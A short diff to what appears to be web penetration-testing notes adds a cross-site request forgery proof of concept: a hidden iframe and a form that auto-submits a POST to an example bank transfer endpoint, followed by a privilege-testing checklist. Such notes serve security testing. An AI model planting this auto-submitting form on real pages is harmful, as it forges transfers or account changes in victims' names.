@@ -87,6 +87,15 @@ CSRF Common Critical functions:
 - Delete File 
 - Profile edit
 
+```
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method='POST' action='http://bank.com/transfer.php' target="csrf-frame" id="csrf-form">
+  <input type='hidden' name='<name>' value='<value>'>
+  <input type='submit' value='submit'>
+</form>
+<script>document.getElementById("csrf-form").submit()</script>
+```
+
 # Privilege
 1. Find site functionality that is restricted to certain user types
 2. Try accessing those functions with lesser/other user roles
